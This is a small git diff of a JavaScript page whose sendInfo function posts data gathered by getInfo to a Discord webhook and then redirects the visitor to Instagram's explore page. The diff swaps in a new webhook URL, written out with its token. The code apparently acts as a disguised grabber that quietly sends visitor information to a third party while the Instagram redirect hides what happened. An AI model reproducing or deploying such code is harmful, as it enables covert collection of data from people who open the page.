@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discordapp.com/api/webhooks/1421307902697934929/bt47cun8kkms5hx6JzaFb47tC2LepGop9f-PH8outr37ZwKzaTaPm-mDdIGS1pIBH527"; //your discord webhook url
+  const webhook = "https://discordapp.com/api/webhooks/1423279153456615448/ELODBW6d3TPxnzR5q4hczZF2b5w0CLMu1hCTdtbQ8jfLC59MLJq16oVRfZBIj5KF0oLL"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
@@ -88,5 +88,6 @@ async function sendInfo() {
     window.location.replace("https://www.instagram.com/explore/")
   }, 1000);
 }
+
 
 
